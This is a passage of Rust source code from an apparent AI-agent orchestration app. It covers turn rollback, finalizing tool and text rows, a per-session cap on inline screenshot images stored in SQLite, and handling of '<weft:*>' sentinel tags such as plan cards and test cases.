            )
            .await;
            completed.store(true, std::sync::atomic::Ordering::Release);
        }
    }
}

/// Finish a hidden-delivery receipt and release its admission reservation.
///
/// `consumed == true` covers both `consume_lead_hidden_delivery` success and
/// the idempotent `Ok(None)` (the row was already consumed/deleted). Clear the
/// in-memory marker only when it still names this delivery: a TurnEnd may have
/// retargeted it to a queued visible/hidden turn in the meantime. On a DB
/// failure, release the reservation so the next visible admission may retry;
/// re-arm the one-shot activity gate only when this delivery is still the
/// current turn, avoiding attribution to a later turn.
fn finish_hidden_receipt(inner: &mut EngineInner, delivery_id: i32, consumed: bool) {
    inner.hidden_receipt_inflight.remove(&delivery_id);
    if inner.turn_user_row != Some(-delivery_id) {
        return;
    }
    if consumed {
        inner.turn_user_row = None;
    } else {
        inner.clock.rearm_consumed_gate();
    }
}

async fn begin_hidden_turn(
    app: &AppHandle,
    db: &Db,
    inner: &mut EngineInner,
    hidden_delivery_id: Option<i32>,
) -> i32 {
    let turn_id = mark_hidden_turn_started_with_delivery(inner, hidden_delivery_id);
    crate::power::on_turn_began(app);
    // Hidden delivery is a turn-start too, so persist `running`; otherwise a
    // crash mid-action can leave stale `idle` state and skip boot revive.
    persist_activity(db, inner.session_id, inner.thread_id, "running").await;
    emit_turn_state(
        app,
        inner.thread_id,
        inner.session_id,
        inner.turn.busy,
        queue_items(&inner.turn),
    );
    turn_id
}

fn queue_hidden_delivery(app: &AppHandle, inner: &mut EngineInner, out: Outgoing) {
    inner.turn.queue.push_back(out);
    emit_turn_state(
        app,
        inner.thread_id,
        inner.session_id,
        inner.turn.busy,
        queue_items(&inner.turn),
    );
}

/// `status` distinguishes WHY the turn died: "error" for a genuine failure,
/// "interrupted" when a stop/interrupt canceled it (a guard-canceled spawn must
/// not be reported as an agent failure).
/// Drain the consumer for `session_id`, then finalize every row this turn left
/// open, as `status`.
///
/// The queued-prompt error path skipped both. `reset_failed_hidden_turn` clears
/// `inner.current` outright, so a follow-up prompt that had already streamed
/// text before its JSON-RPC request failed left that row `streaming` in the DB
/// with nothing to ever close it — and updates still sitting in the consumer
/// could arrive after the turn was reset and attach to an idle session. The
/// first-prompt path gets this via `acp_drain_then_end`; this is the same
/// sequence, in the same order, for the failure branch.
async fn acp_drain_and_finalize_open_rows(
    app: &AppHandle,
    db: &Db,
    eng: &EngineRef,
    client: &crate::acp::runtime::ClientHandle,
    session_id: &str,
    status: &str,
) {
    let (tx, rx) = tokio::sync::oneshot::channel();
    if client
        .send_session_event(
            session_id,
            crate::acp::runtime::SessionEvent::DrainBarrier(tx),
        )
        .await
    {
        // Bounded, same as the success path: a gone consumer must not hang this.
        let _ = tokio::time::timeout(std::time::Duration::from_secs(5), rx).await;
    }
    let mut inner = eng.lock().await;
    let thread_id = inner.thread_id;
    let orphans: Vec<(i32, serde_json::Value)> = inner.tool_rows.drain().map(|(_, v)| v).collect();
    finalize_orphan_tool_rows(app, db, thread_id, orphans, status).await;
    finalize_open_texts(app, db, &mut inner, status).await;
    if inner.current.is_some() {
        finalize_current_text(app, db, &mut inner, status).await;
    }
}

async fn rollback_failed_turn(
    app: &AppHandle,
    db: &Db,
    eng: &EngineRef,
    turn_id: i32,
    status: &str,
) {
    let mut inner = eng.lock().await;
    let Some(drained) = reset_failed_hidden_turn(&mut inner, turn_id) else {
        return;
    };
    let thread_id = inner.thread_id;
    let session_id = inner.session_id;
    persist_activity(db, session_id, thread_id, "idle").await;
    emit_turn_state(app, thread_id, session_id, false, Vec::new());
    drop(inner);
    // Finalize EXACTLY the rows drained under the lock (same rule as
    // rollback_canceled_send): a session-wide sweep here could catch a
    // concurrent send's freshly inserted queued row and fail a message that is
    // about to be delivered.
    if !drained.is_empty() {
        match repo::set_queued_status_by_ids(db, &drained, status).await {
            Ok(rows) => {
                for m in rows {
                    emit_finalize(app, thread_id, m.id, status);
                }
            }
            Err(e) => eprintln!("[weft] failed-turn queue finalize failed: {e}"),
        }
    }
}

async fn rollback_failed_visible_turn(
    app: &AppHandle,
    db: &Db,
    eng: &EngineRef,
    turn_id: i32,
    message_id: i32,
    content: &str,
    status: &str,
) {
    let thread_id = { eng.lock().await.thread_id };
    let _ = repo::update_lead_message(db, message_id, content, status).await;
    emit_finalize(app, thread_id, message_id, status);
    rollback_failed_turn(app, db, eng, turn_id, status).await;
}

/// After a spawn attempt fails, decide the rollback status: if the send's
/// reservation is no longer valid, a stop/interrupt/reset raced the spawn
/// window and the guard canceled it — that is the USER's cancel
/// ("interrupted"), not an agent failure ("error").
async fn spawn_failure_status(eng: &EngineRef, ctx: &SendContext) -> &'static str {
    let g = eng.lock().await;
    if send_reservation_valid(&g, ctx) {
        "error"
    } else {
        "interrupted"
    }
}

/// The drain-shaped sibling of [`spawn_failure_status`]: rollback status for a
/// DEQUEUED delivery that failed — "interrupted" when the stop/interrupt/epoch
/// guard canceled it (the user's cancel), "error" for a genuine failure.
async fn drain_failure_status(eng: &EngineRef, dequeue_epoch: u64) -> &'static str {
    let g = eng.lock().await;
    if g.stopped || g.interrupting || g.reset_epoch != dequeue_epoch {
        "interrupted"
    } else {
        "error"
    }
}

/// A dequeued (popped) message is no longer in the in-memory queue, so a
/// rollback's drained-ids sweep cannot see its row — finalize it explicitly, or
/// a canceled/failed dequeued message stays `queued` in the DB forever.
async fn finalize_dequeued_row(
    app: &AppHandle,
    db: &Db,
    thread_id: i32,
    out: &Outgoing,
    status: &str,
) {
    let Some(id) = out.queue_id else { return };
    match repo::set_queued_status_by_ids(db, &[id], status).await {
        Ok(rows) => {
            for m in rows {
                emit_finalize(app, thread_id, m.id, status);
            }
        }
        Err(e) => eprintln!("[weft] dequeued row finalize failed: {e}"),
    }
}

/// Finalize tool rows still awaiting a result, marking each `status` and pushing
/// the update. Called wherever a turn ends — clean TurnEnd, stop/takeover,
/// runaway kill, or process EOF — so a `tool_use` whose `tool_result` never
/// arrived stops spinning in the timeline and the DB.
async fn finalize_orphan_tool_rows(
    app: &AppHandle,
    db: &Db,
    thread_id: i32,
    rows: Vec<(i32, serde_json::Value)>,
    status: &str,
) {
    for (row_id, content) in rows {
        let content_str = content.to_string();
        let _ = repo::update_lead_message(db, row_id, &content_str, status).await;
        let _ = app.emit(
            EVENT,
            Push::ToolResult {
                thread_id,
                message_id: row_id,
                content: content_str,
                status: status.into(),
            },
        );
    }
}

/// Persisted status for a tool row. A row with output is terminal
/// (error/complete). A running row streams ONLY if it carries an id to correlate
/// its later result by — an id-less running row is stored complete so it can't
/// spin forever (nothing could ever fill it).
fn tool_row_status(has_output: bool, trackable: bool, is_error: bool) -> &'static str {
    if has_output {
        if is_error {
            "error"
        } else {
            "complete"
        }
    } else if trackable {
        "streaming"
    } else {
        "complete"
    }
}

/// Build a `kind:"tool"` row's persisted content (issue #99): `agentThread`
/// tags a sub-agent's OWN tool call (e.g. it calling `read_file`) with which
/// sub-agent produced it, and — orthogonally — a `collabAgentToolCall` call's
/// `collab_threads` tags the row with whichever sub-agent thread id(s) IT
/// knows about, so the frontend can anchor that thread's branch here. Neither
/// key is present at all when empty/None, so an ordinary tool call's content
/// is byte-identical to pre-#99 output — same contract as `text_row_content`.
/// `images` (screenshot data URIs, if the call itself already carries any —
/// see `proto::ToolCall::images`) follows the identical "present only when
/// non-empty" rule, so an old persisted row with no `images` key and a fresh
/// image-less row parse identically on the frontend (default empty array).
/// Pure and DB-free by design: `persist_tool_calls` is the only caller in the
/// live path, but keeping this separate lets it be unit-tested directly.
fn tool_row_content(
    call: &super::proto::ToolCall,
    agent_thread: Option<&str>,
) -> serde_json::Value {
    let mut content = serde_json::json!({
        "name": call.name,
        "summary": call.summary,
        "input": call.input,
        "output": call.output.clone().unwrap_or_default(),
        "is_error": call.is_error,
    });
    if let Some(obj) = content.as_object_mut() {
        if let Some(t) = agent_thread {
            obj.insert("agentThread".into(), t.into());
        }
        if !call.collab_threads.is_empty() {
            obj.insert("collabThreads".into(), call.collab_threads.clone().into());
        }
        if !call.images.is_empty() {
            obj.insert("images".into(), call.images.clone().into());
        }
    }
    content
}

/// Persist a turn's tool calls as `kind:"tool"` rows (running until their result
/// arrives). Shared by spawn_reader (claude/exec, always `agent_thread: None` —
/// those dialects have no collab/sub-agent concept) and codex_consumer
/// (app-server, issue #99). `merge_tool_results` mutates this row's stored
/// content value in place (never rebuilds it), so both tags `tool_row_content`
/// sets survive into the result.
async fn persist_tool_calls(
    app: &AppHandle,
    db: &Db,
    inner: &mut EngineInner,
    tools: Vec<super::proto::ToolCall>,
    agent_thread: Option<String>,
) {
    let thread_id = inner.thread_id;
    for call in tools {
        let (sid, turn) = (inner.session_id, inner.turn_id);
        let running = call.output.is_none();
        let trackable = running && !call.id.is_empty();
        let status = tool_row_status(!running, trackable, call.is_error);
        let call_id = call.id.clone();
        let content = tool_row_content(&call, agent_thread.as_deref());
        let content_str = content.to_string();
        match repo::insert_lead_message(
            db,
            thread_id,
            sid,
            turn,
            "assistant",
            "tool",
            &content_str,
            status,
        )
        .await
        {
            Ok(m) => {
                let row_id = m.id;
                let _ = app.emit(
                    EVENT,
                    Push::Message {
                        thread_id,
                        message: m,
                    },
                );
                if trackable {
                    inner.tool_rows.insert(call_id, (row_id, content));
                }
            }
            Err(e) => eprintln!("[weft] lead tool row insert failed: {e}"),
        }
    }
}

/// Merge a `ToolResultItem` into its running row's already-persisted content —
/// pure and DB-free by the same split as `tool_row_content` (its sibling
/// assembly point), so it's unit-testable directly. `output`/`is_error` are
/// UNCONDITIONALLY overwritten: the call-side row only ever held a running
/// placeholder for them (empty string / false), so the result is the first and
/// only authoritative value either field gets. `images` follows that SAME
/// "result overrides the call side" rule — written (replacing whatever the
/// call-side JSON held, if anything) when the result carries any, and the key
/// removed otherwise, so a call-side stub can never survive stale into the
/// terminal row. `collabThreads` is intentionally NOT symmetric with that: it
/// keeps its own "merge when non-empty, otherwise leave whatever's already
/// there untouched" rule (see the comment below) because a `spawnAgent`
/// call's `receiverThreadIds` becoming known here is filling in a value the
/// call side legitimately hadn't resolved yet — not a terminal result
/// superseding the call's own claim, so an empty item-side list must never
/// erase a real thread id the call side already recorded.
fn merge_tool_result_content(content: &mut serde_json::Value, item: &super::proto::ToolResultItem) {
    let Some(obj) = content.as_object_mut() else {
        return;
    };
    obj.insert("output".into(), item.output.clone().into());
    obj.insert("is_error".into(), item.is_error.into());
    // a `spawnAgent` collab call's `receiverThreadIds` is empty at
    // item/started (captured — emptily — into this row's content by
    // persist_tool_calls) and only becomes known HERE, at item/completed.
    // Merge it in now so the frontend can still anchor that thread's branch to
    // this row once it re-renders — until then, the child's own rows (already
    // tagged with agentThread) have no known anchor yet and correctly render
    // top-level/flat (collabBranches.ts's groupTimeline is a stateless
    // whole-array recompute, so this is an honest "not resolved yet", not a
    // wrong guess: nothing is hidden, it just hasn't grouped yet).
    if !item.collab_threads.is_empty() {
        obj.insert("collabThreads".into(), item.collab_threads.clone().into());
    }
    if item.images.is_empty() {
        obj.remove("images");
    } else {
        obj.insert("images".into(), item.images.clone().into());
    }
}

/// how many of a session's most
/// recent tool-result rows may keep their inline screenshot data URIs in
/// `content.images` at once. Screenshot data URIs run from a few hundred KB
/// to a couple MB each (see `lead_chat::proto::cap_and_dedup_images`'s own
/// `MAX_CHARS`); an unthrottled screenshot loop — Full/Always-granted
/// computer use, no per-call card left to slow it down — can otherwise
/// persist hundreds of these into SQLite with NO bound at all: this
/// module's own per-CALL cap (`cap_and_dedup_images`, ≤4 images per single
/// result) does nothing to stop that ACROSS calls, and `history` load then
/// hands the whole accumulated payload to the frontend on every reload. Kept
/// SMALL: an older screenshot is still reachable by its file path, which
/// lives in the SAME row's `output` text (the "text path
/// is never dropped" rule) — this cap only prunes the redundant INLINE
/// base64 copy once it's no longer among the most recent few, never the
/// on-disk file or the row's own text, and never the CURRENT call's own
/// inline image (see `merge_tool_results`'s own doc). The
/// P2: this cap is enforced per-SESSION (see
/// `enforce_durable_inline_image_cap_db`'s own doc) — a thread's several
/// lead/worker timelines each get their own `MAX_INLINE_IMAGE_ROWS` budget,
/// not one shared across all of them.
const MAX_INLINE_IMAGE_ROWS: usize = 4;

/// Push a newly-completed, image-bearing tool row onto `rows` (oldest first)
/// and return the updated queue plus every entry that must be evicted to
/// keep it at [`MAX_INLINE_IMAGE_ROWS`] or fewer (oldest evicted first).
/// Pure/synchronous — no `Db`/`AppHandle` — so this exact retention decision
/// is unit-testable directly; `merge_tool_results` is the only production
/// caller, and owns applying each eviction as its own `repo::
/// update_lead_message` rewrite (stripping `images` from that row's OWN
/// already-persisted content, keeping its `output` text untouched).
fn track_inline_image_row(
    mut rows: std::collections::VecDeque<(i32, bool, serde_json::Value)>,
    new_row: (i32, bool, serde_json::Value),
) -> (
    std::collections::VecDeque<(i32, bool, serde_json::Value)>,
    Vec<(i32, bool, serde_json::Value)>,
) {
    rows.push_back(new_row);
    let mut evicted = Vec::new();
    while rows.len() > MAX_INLINE_IMAGE_ROWS {
        if let Some(oldest) = rows.pop_front() {
            evicted.push(oldest);
        }
    }
    (rows, evicted)
}

/// the DURABLE, restart-safe half of the inline-
/// image retention cap. `inner.inline_image_rows` above only ever sees rows
/// written during THIS process's own lifetime — a restart starts that queue
/// empty, so a session that keeps napping computer-use screenshots across
/// restarts could silently re-accumulate past `MAX_INLINE_IMAGE_ROWS` inline
/// images in SQLite forever: nothing before this change closed the gap
/// between "capped for one process's lifetime" and "capped, full stop", and
/// `history` loads read straight off the store (`repo::list_lead_messages`,
/// the SAME query this uses), so an unbounded on-disk backlog was handed to
/// the frontend on every reload regardless of how recently the app itself
/// restarted.
///
/// Queries this thread's OWN persisted `kind:"tool"` rows fresh — ascending
/// by id/seq, matching `history`'s own order — every time a NEW inline image
/// is about to be written, and strips `images` from every row beyond the
/// `MAX_INLINE_IMAGE_ROWS` most recent, DURABLY, in the SAME store `history`
/// reads from. Since the row just written is always the newest by id order,
/// it can never itself land in the stripped slice as long as the cap is at
/// least 1 — nothing here needs to special-case "never touch the row this
/// very call just wrote". `inner.inline_image_rows`'s in-memory pass (in
/// `merge_tool_results`, right after this call) stays as an additional
/// (redundant but harmless — stripping an already-stripped row's absent
/// `images` key is a no-op) fast path; THIS is now the authoritative one.
///
/// Split from the `&AppHandle`-taking wrapper below ([`enforce_durable_
/// inline_image_cap`]) purely so this exact DB-mutating decision is
/// unit-testable directly: this crate's `AppHandle` is the concrete `Wry`
/// runtime with no `tauri::test::mock_app` path (see `post_stall_notice_via`'s
/// own doc for the identical wall), so a function taking `&AppHandle` is
/// unreachable from any test. Returns every `(row_id, content, status)` this
/// call actually stripped and durably rewrote, so the wrapper can push each
/// as a `Push::ToolResult` after this returns.
///
/// `session_id` scopes the candidate rows
/// to ONE session's own timeline — `None` for the lead, `Some(id)` for a
/// chat-mode worker — mirroring how every other per-timeline read in this
/// module (e.g. `rewind`'s own `filter(|m| m.session_id == snap.session_id)`)
/// treats `lead_message.session_id` as the timeline key, NOT `thread_id`
/// alone. A thread can host several lead/worker sessions at once, each with
/// its OWN chat history; before this fix, `list_lead_messages(db, thread_id)`
/// pulled every session's tool rows into ONE shared retention queue, so a
/// screenshot-heavy worker in repo A could strip the most-recent inline
/// images off a DIFFERENT worker's (repo B's) timeline, leaving B under the
/// `MAX_INLINE_IMAGE_ROWS` cap it's entitled to on its own.
async fn enforce_durable_inline_image_cap_db(
    db: &Db,
    thread_id: i32,
    session_id: Option<i32>,
) -> Vec<(i32, String, String)> {
    // query ONLY this session's
    // image-candidate tool rows — the old whole-thread `list_lead_messages`
    // load re-scanned every session's entire history on each new screenshot,
    // quadratic as the timeline grows, on the engine-consumer path.
    let Ok(messages) = repo::list_session_image_tool_messages(db, thread_id, session_id).await
    else {
        return Vec::new();
    };
    // Oldest-first (matches the query's own order) every persisted
    // tool row that STILL carries an inline image, scoped to THIS session
    // alone (`session_id` above), paired with its already-parsed JSON.
    //
    // a row counts toward the
    // retention limit ONLY when its parsed JSON has a genuine TOP-LEVEL
    // `images` collection — NOT merely a `"images"` substring somewhere in the
    // serialized content. A tool result can legitimately mention `"images"`
    // below the top level (e.g. nested inside its own serialized input), and
    // the strip below already refuses to touch such a row; but COUNTING it
    // still inflated `keep_from` and could push a genuine older screenshot
    // into the stripped slice even while fewer than `MAX_INLINE_IMAGE_ROWS`
    // real image rows existed. Parsing up front and requiring a top-level key
    // makes the boundary reflect real image rows only. The cheap `.contains`
    // pre-check stays purely as a parse-avoidance fast path (this session's
    // non-image rows never pay for a parse), NOT as the counting predicate.
    let image_bearing: Vec<(&lead_message::Model, serde_json::Value)> = messages
        .iter()
        .filter_map(|m| {
            let value = serde_json::from_str::<serde_json::Value>(&m.content).ok()?;
            let has_top_level_images = value
                .as_object()
                .is_some_and(|obj| obj.contains_key("images"));
            has_top_level_images.then_some((m, value))
        })
        .collect();
    let keep_from = image_bearing.len().saturating_sub(MAX_INLINE_IMAGE_ROWS);
    let mut stripped = Vec::new();
    for (m, mut value) in image_bearing.into_iter().take(keep_from) {
        // Guaranteed an object with a top-level `images` key — that is exactly
        // the filter `image_bearing` was built from — so `remove` here always
        // strips a real inline-image collection.
        let Some(obj) = value.as_object_mut() else { continue };
        if obj.remove("images").is_none() {
            continue;
        }
        let content_str = value.to_string();
        if repo::update_lead_message(db, m.id, &content_str, &m.status)
            .await
            .is_ok()
        {
            stripped.push((m.id, content_str, m.status.clone()));
        }
    }
    stripped
}

/// The live wrapper: runs [`enforce_durable_inline_image_cap_db`] and pushes
/// a `Push::ToolResult` for each row it actually stripped, so an open
/// frontend timeline reflects the durable trim immediately rather than only
/// on the next reload. `session_id` is threaded straight through to scope the
/// cap to the calling session's own timeline (the
/// Rec — see [`enforce_durable_inline_image_cap_db`]'s own doc for why).
async fn enforce_durable_inline_image_cap(
    app: &AppHandle,
    db: &Db,
    thread_id: i32,
    session_id: Option<i32>,
) {
    for (message_id, content, status) in
        enforce_durable_inline_image_cap_db(db, thread_id, session_id).await
    {
        let _ = app.emit(EVENT, Push::ToolResult { thread_id, message_id, content, status });
    }
}

/// Merge tool results into their running rows (claude tool_result / codex
/// item.completed); a result for an untracked row is dropped.
///
/// a result carrying inline images is tracked in
/// `inner.inline_image_rows` (bounded, in-memory, this engine's own
/// lifetime) AFTER it persists — [`track_inline_image_row`] then reports any
/// OLDER row that must be pruned to stay at the cap, and each one has its
/// `images` key stripped from its ALREADY-persisted content and rewritten,
/// right here. This never touches the CURRENT item's own `content` (already
/// written above, images intact) — M3-B's "this screenshot inlines for a
/// capable engine" contract is unaffected; only OLDER rows' accumulated
/// history is pruned. the AUTHORITATIVE cap is no
/// longer this in-memory pass — see [`enforce_durable_inline_image_cap`],
/// called right after it, for the restart-safe, DB-sourced enforcement that
/// now bounds this regardless of how many times the app has restarted since.
async fn merge_tool_results(
    app: &AppHandle,
    db: &Db,
    inner: &mut EngineInner,
    items: Vec<super::proto::ToolResultItem>,
) {
    let thread_id = inner.thread_id;
    for item in items {
        let Some((row_id, mut content)) = inner.tool_rows.remove(&item.id) else {
            continue;
        };
        merge_tool_result_content(&mut content, &item);
        let status = if item.is_error { "error" } else { "complete" };
        let content_str = content.to_string();
        let _ = repo::update_lead_message(db, row_id, &content_str, status).await;
        let _ = app.emit(
            EVENT,
            Push::ToolResult {
                thread_id,
                message_id: row_id,
                content: content_str,
                status: status.into(),
            },
        );
        if !item.images.is_empty() {
            let rows = std::mem::take(&mut inner.inline_image_rows);
            let (rows, evicted) = track_inline_image_row(rows, (row_id, item.is_error, content));
            inner.inline_image_rows = rows;
            for (old_row_id, old_is_error, mut old_content) in evicted {
                if let Some(obj) = old_content.as_object_mut() {
                    obj.remove("images");
                }
                let old_status = if old_is_error { "error" } else { "complete" };
                let old_content_str = old_content.to_string();
                if repo::update_lead_message(db, old_row_id, &old_content_str, old_status)
                    .await
                    .is_ok()
                {
                    let _ = app.emit(
                        EVENT,
                        Push::ToolResult {
                            thread_id,
                            message_id: old_row_id,
                            content: old_content_str,
                            status: old_status.into(),
                        },
                    );
                }
            }
            // the DB-write-path cap runs on every
            // new inline image regardless of the in-memory pass above — see
            // `enforce_durable_inline_image_cap`'s own doc for why this one,
            // not the in-memory queue, is the authoritative bound.
            // `inner.session_id` scopes it to THIS
            // session's own timeline so a different session sharing the same
            // thread can't have ITS most-recent inline images stripped by an
            // unrelated session's screenshot volume.
            enforce_durable_inline_image_cap(app, db, thread_id, inner.session_id).await;
        }
    }
}

/// Persist / answer the `<weft:*>` sentinels forked out of a finalized assistant
/// message — action_card / plan_card become their own rows, list_repos triggers
/// a hidden stdin-style reply. Errors are logged but never abort the stream.
/// Shared by the exec/claude reader and the codex app-server consumer so both
/// transports render the cards and answer list_repos.
async fn apply_lead_sentinels(
    app: &AppHandle,
    db: &Db,
    inner: &mut EngineInner,
    thread_id: i32,
    sentinels: Vec<super::sentinels::Sentinel>,
) {
    for s in sentinels {
        match s {
            super::sentinels::Sentinel::ActionCard(json) => {
                persist_card_row(app, db, inner, thread_id, "action_card", &json).await;
            }
            // Card payloads persist VERBATIM. Model-side over-escaping (literal
            // backslash-n paragraph breaks) is corrected at the source — the
            // plan-card directives mandate normally-escaped JSON — because any
            // content-based healing of decoded strings can corrupt legitimate
            // literals (Windows paths, escape-explaining prose).
            super::sentinels::Sentinel::PlanCard(json) => {
                persist_card_row(app, db, inner, thread_id, "plan_card", &json).await;
            }
            super::sentinels::Sentinel::TestCases(md) => {
                // Issue-level document — only the LEAD may write it. Chat-mode
                // workers share this engine (session_id set); a worker echoing
                // protocol text (or prompt-injected repo content) must not
                // replace the issue's cases from its own timeline. (Extraction
                // is already lead-gated; this is defense in depth.)
                if inner.session_id.is_some() {
                    eprintln!(
                        "[weft] worker sentinel: test_cases ignored (lead-only, issue-level doc)"
                    );
                    continue;
                }
                // A user edit saved MID-TURN supersedes whatever this turn
                // emits — the emit was authored without seeing it. The queue
                // check is the fast path (undelivered feedback); the write
                // itself is an ATOMIC compare-and-swap in SQL, so a save
                // landing at any point before the UPDATE still wins.
                if has_pending_user_test_update(&inner.turn) {
                    eprintln!(
                        "[weft] lead sentinel: test_cases skipped — a queued user edit \
                         supersedes this turn's emit"
                    );
                    continue;
                }
                // Raw markdown body: upsert the document (single source of
                // truth), then drop a summary card into the timeline — the
                // panel always reads the table, never the card.
                let md = md.trim();
                if md.is_empty() {
                    eprintln!("[weft] lead sentinel: test_cases body is empty — dropped");
                } else {
                    match repo::lead_upsert_test_plan(db, thread_id, md, inner.clock.started_millis)
                        .await
                    {
                        Ok(true) => {
                            let summary = super::test_plan::summarize(md).to_string();
                            persist_card_row(app, db, inner, thread_id, "test_cases", &summary)
                                .await;
                        }
                        Ok(false) => {
                            eprintln!(
                                "[weft] lead sentinel: test_cases skipped — a user edit \
                                 saved mid-turn supersedes this emit"
                            );
                        }
                        Err(e) => {
                            eprintln!("[weft] lead sentinel: upsert test_plan failed: {e}")
                        }
                    }
                }
            }
            super::sentinels::Sentinel::ListRepos => {
                // Look up workspace via the thread row (engine doesn't cache it; one
                // extra query per call is cheap and avoids a wider refactor).
                let ws_id = match repo::get_thread(db, thread_id).await {
                    Ok(Some(t)) => Some(t.workspace_id),
                    Ok(None) => {
                        eprintln!(
                            "[weft] lead sentinel: list_repos — thread {thread_id} not found"
                        );
                        None
                    }
                    Err(e) => {
                        eprintln!("[weft] lead sentinel: list_repos — get_thread failed: {e}");
                        None
                    }
                };
                if let Some(workspace_id) = ws_id {
                    let repos = match repo::list_repos(db, workspace_id).await {
                        Ok(r) => r,
                        Err(e) => {
                            eprintln!("[weft] lead sentinel: list_repos query failed: {e}");
                            Vec::new()
                        }
                    };
                    let payload = serde_json::json!({
                        "repos": repos.iter().map(|r| serde_json::json!({
                            "id": r.id,
                            "name": r.name,
                            "slug": r.slug,
                            "local_git_path": r.local_git_path,
                            "base_ref": r.base_ref,
                        })).collect::<Vec<_>>()
                    });
                    let body = match serde_json::to_string(&payload) {
                        Ok(s) => s,
                        Err(e) => {
                            eprintln!(
                                "[weft] lead sentinel: serialize list_repos_result failed: {e}"
                            );
                            continue;
                        }
                    };
                    let reply = format!("<weft:list_repos_result>{body}</weft:list_repos_result>");
                    // Invisible plumbing: tracked=false keeps this off the timeline;
                    // the agent reads it as a tool-result-style user turn.
                    let out = Outgoing {
                        text: reply,
                        images: Vec::new(),
                        tracked: false,
                        origin_tag: None,
                        queue_id: None,
                        has_attachments: false,
                        local_image_paths: Vec::new(),
                    };
                    queue_hidden_delivery(app, inner, out);
                }
            }
        }
    }
}

/// True when an undelivered user edit of the test-case document is still
/// queued for this engine: the in-flight turn was authored WITHOUT seeing it,
/// so any `<weft:test_cases>` it emits is stale relative to the user's save
/// and must not overwrite the user-sourced row.
fn has_pending_user_test_update(turn: &TurnState) -> bool {
    turn.queue
        .iter()
        .any(|o| o.text.contains("<weft:test_cases_updated>"))
}

/// Persist one card sentinel (`action_card` / `plan_card`) as its own timeline
/// row and push it to the UI. Rejects anything that isn't a JSON object so the
/// UI can rely on the card's fields; errors are logged, never fatal.
async fn persist_card_row(
    app: &AppHandle,
    db: &Db,
    inner: &EngineInner,
    thread_id: i32,
    kind: &str,
    json: &str,
) {
    match serde_json::from_str::<serde_json::Value>(json) {
        Ok(v) if v.is_object() => {
            let (sid, turn) = (inner.session_id, inner.turn_id);
            match repo::insert_lead_message(
                db,
                thread_id,
                sid,
                turn,
                "assistant",
                kind,
                json,
                "complete",
            )
            .await
            {
                Ok(m) => {
                    let _ = app.emit(
                        EVENT,
                        Push::Message {
                            thread_id,
                            message: m,
                        },
                    );
                }
                Err(e) => eprintln!("[weft] lead sentinel: insert {kind} failed: {e}"),
            }
        }
        Ok(_) => eprintln!("[weft] lead sentinel: {kind} payload is not an object — dropped"),
        Err(e) => eprintln!("[weft] lead sentinel: {kind} JSON parse failed: {e}"),
    }
}

/// Finalize the open streaming text row (codex app-server): fork `<weft:*>`
/// sentinels out of the body on a clean finish, persist the cleaned text, close
/// its IM streaming card, and clear `inner.current`. Called both at a tool
/// boundary — so post-tool deltas open a NEW row BELOW the tool, keeping inline
/// tool history in order — and at turn end. No-op when no row is open.
async fn finalize_current_text(app: &AppHandle, db: &Db, inner: &mut EngineInner, status: &str) {
    let Some((id, text, _)) = inner.current.take() else {
        return;
    };
    // `current` (the anonymous slot) is never a sub-agent branch — see its doc.
    finalize_text_row(app, db, inner, id, text, status, false, None).await;
}

/// Finalize every item-keyed open text row (app-server parallel streams) with
/// `status`. Row order is already fixed by insertion; drain order is irrelevant.
async fn finalize_open_texts(app: &AppHandle, db: &Db, inner: &mut EngineInner, status: &str) {
    let rows: Vec<(i32, String, Option<String>)> = inner
        .open_texts
        .drain()
        .map(|(_, r)| (r.row, r.buf, r.agent_thread))
        .collect();
    for (id, text, agent_thread) in rows {
        finalize_text_row(
            app,
            db,
            inner,
            id,
            text,
            status,
            false,
            agent_thread.as_deref(),
        )
        .await;
    }
}

/// Row-level text finalize: sentinel extraction on clean completion, DB write,
/// `Push::Finalize`, IM out. Shared by the anonymous slot (`current`), the
/// item-keyed rows (`open_texts`), and standalone one-shot texts (`TextDone`).
/// `replaced` = the body already differs from what streamed to the frontend
/// (authoritative TextDone override / standalone rows inserted empty) — the
/// finalize push must then carry the content even when sentinels changed nothing,
/// or the live React state keeps the stale streamed chunks until a reload.
/// `agent_thread` (issue #99) is re-embedded into the rewritten content here —
/// this is the row's LAST content write for the turn, so a cold reload must see
/// the same tag the live view showed, not lose it to this rebuild.
async fn finalize_text_row(
    app: &AppHandle,
    db: &Db,
    inner: &mut EngineInner,
    id: i32,
    text: String,
    status: &str,
    replaced: bool,
    agent_thread: Option<&str>,
) {
    let thread_id = inner.thread_id;
    let origin_tag = inner.current_origin_tag.clone();
    // Single source for the "this turn produced visible text" invariant: ANY
    // row completing mid-turn (streamed item, standalone TextDone, anonymous
    // slot) marks the turn, so a later failure never appends *_before_output
    // after real output. Turn boundaries (TurnEnd / disconnect / hard stop)
    // reset it.
    if status == "complete" {
        inner.turn_saw_text = true;
    }
    // `stripped` = the cleaned body differs from what streamed (sentinels removed),
    // so the live row still shows the raw tags and must be replaced, not just status.
    let (clean, stripped) = if status == "complete" {
        let (clean, sentinels) =
            super::sentinels::extract_sentinels_with(&text, inner.session_id.is_none());
        let stripped = clean != text;
        apply_lead_sentinels(app, db, inner, thread_id, sentinels).await;
        (clean, stripped)
    } else {
        (text, false)
    };
    let _ =
        repo::update_lead_message(db, id, &text_row_content(&clean, agent_thread), status).await;
    let _ = app.emit(
        EVENT,
        Push::Finalize {
            thread_id,
            message_id: id,
            status: status.into(),
            content: (stripped || replaced).then(|| clean.clone()),
            seq: None,
        },
    );
    if status == "complete" {
        emit_lead_out(app, thread_id, id, &clean, origin_tag);
    }
}

/// Nothing about a turn is in flight or half-written: no busy turn, no open
/// text or tool rows, no queue. [`cleanup_disconnected_turn`] has nothing to
/// tear down in that state and returns immediately.
///
/// Named rather than inlined because callers reason about the skip. Notably
/// `codex_consumer`: an app-server that dies BETWEEN turns finds the engine in
/// exactly this state, so anything that must happen on a disconnect — the
/// bearer revoke especially — cannot be placed inside that cleanup alone.
fn turn_state_is_untouched(inner: &EngineInner) -> bool {
    !inner.turn.busy
        && inner.current.is_none()
        && inner.open_texts.is_empty()
        && inner.turn.queue.is_empty()
        && inner.tool_rows.is_empty()
}

async fn cleanup_disconnected_turn(
    app: &AppHandle,
    db: &Db,
    eng: &EngineRef,
    fallback_status: &str,
) {
    let mut inner = eng.lock().await;
    if turn_state_is_untouched(&inner) {
        return;
    }
    let thread_id = inner.thread_id;
    let session_id = inner.session_id;
    let had_busy_turn = inner.turn.busy;
    let turn_id = inner.turn_id;
    let status = if inner.interrupting {
        "interrupted"
    } else {
        fallback_status
    };
    let current = inner.current.take().map(|(id, text, _)| (id, text));
